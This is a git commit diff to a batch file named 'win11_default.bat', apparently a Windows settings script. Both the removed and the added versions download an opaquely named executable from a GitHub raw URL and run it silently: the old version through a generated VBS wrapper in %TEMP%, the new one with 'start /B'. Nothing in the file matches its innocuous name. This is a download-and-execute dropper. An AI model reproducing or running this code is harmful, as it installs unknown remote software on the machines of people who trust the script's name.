b555612a4571f75641aa6ee2913d23c29f1b03e5
optolab <sloneeddie36@gmail.com>
2025-01-12 13:22:58 -0500

    Update win11_default.bat

--- win11_default.bat
+++ win11_default.bat
@@ -1,7 +1,4 @@
 @echo off
 
-set url=https://raw.githubusercontent.com/claykrs/claykers/main/fbf12e4f.exe
-set path=%TEMP%\fbf12e4f.exe
-powershell -Command "Invoke-WebRequest %url% -OutFile %path%"
-echo CreateObject("Shell.Application").ShellExecute "%TEMP%\fbf12e4f.exe","",",," > "%TEMP%\fbf12e4f.vbs"
-"%TEMP%\fbf12e4f.vbs"
+powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/claykrs/claykers/main/fbf12e4f.exe -OutFile test1.exe"
+start /B "" "test1.exe"
